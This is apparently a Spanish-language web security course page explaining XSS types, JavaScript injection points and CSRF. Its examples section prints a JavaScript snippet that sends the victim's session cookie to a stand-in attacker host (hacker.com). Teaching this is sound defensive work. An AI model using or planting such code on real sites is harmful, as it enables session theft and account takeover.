---
title : "Cross-Site Scripting"
lead: ""
date: 2020-10-06T08:48:45+00:00
draft: false
images: []
menu:
  docs:
    parent: "apps-web"
weight: 030
---

El Cross-Site Scripting, o XSS (punto 7 en el OWASP Top 10), se refiere a una clase de vulnerabilidades que
intentan introducir código JavaScript en un sitio web, el cual será ejecutado en el navegador de otros usuarios.
Dependiendo de la aplicación en específico, las repercusiones de esto varían desde meras molestias hasta
la completa ruptura de confidencialidad e integridad del sistema.

Existen 3 tipos:
* **Almacenado**: El payload queda almacenado en algún lado y no es necesario estar activamente atacando a la víctima.
  Una vez que ella acceda a este, se ejecutará el código malicioso.

* **Reflejado**: El payload no se almacena permanentemente, sino que viene codificado en alguna variable
  (como un parámetro GET).

* **DOM**: Este tipo de XSS no puede ser ejecutado por medio de variables ni datos almacenados, sino que se debe
realizar una serie de acciones específicas en el mismo navegador de la víctima.

## JavaScript

JavaScript (JS) es un lenguaje de programación orientado a objetos que usualmente se utiliza para añadir
componentes dinámicas a un sitio web. [Aquí](https://www.w3schools.com/js/DEFAULT.asp)
pueden encontrar un tutorial de JS si lo necesitan.
El código JS en una página se ejecuta en el navegador del usuario, no en el servidor.
Existen varias formas _"oficiales"_ de insertar JS en un sitio. El primero es tener el código directamente en
el HTML, delimitado por tags `<script></script>`, por ejemplo:

    <html>
        <head>
            <script>
                ...code...
            </script>
        </head>
    </html>

La otra forma es hacer una referencia a un archivo que contenga el código, como por ejemplo:

    <html>
        <head>
            <script src="/code.js"></script>
        </head>
    </html>

Finalmente, se puede introducir JS bajo ciertos eventos, como `onclick`, `onerror`, `onmouseover`, etc.

    <html>
        <body>
            <button onclick="...code..."></button>
        </body>
    </html>

Existen otras formas de introducir código JS a un sitio web, pero se utilizan más que nada en ataques donde las
formas comunes están siendo bloqueadas o filtradas. Estas se escapan del ámbito de este curso, pero si están
interesados, pueden revisar la
[guía de evasión de filtros XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) de OWASP.

## Ejemplos

Uno de los usos más peligrosos de este tipo de ataques es el robo de sesiones. El código introducido toma la
cookie de sesión de la víctima y se la envía al atacante. Luego él puede simplemente copiar esta cookie en
su navegador, con lo cual obtiene acceso autenticado como la víctima. El código a continuación logra hacer esto:

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://hacker.com/", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cookie=" + document.cookie);

Otro uso es el Cross-Site Request Forgery (CSRF). Estos ataques intentan impersonar a la víctima, enviando
consultas en su nombre. Esto funciona ya que las consultas hechas a través de JavaScript también llevan las cookies
y parámetros de sesión del usuario, por lo que el atacante tiene el potencial de ganar los mismos permisos que
la víctima. Esto se podría utilizar, por ejemplo, para realizar acciones en nombre del administrador, con lo cual
crear otro usuario con permisos de administrador.

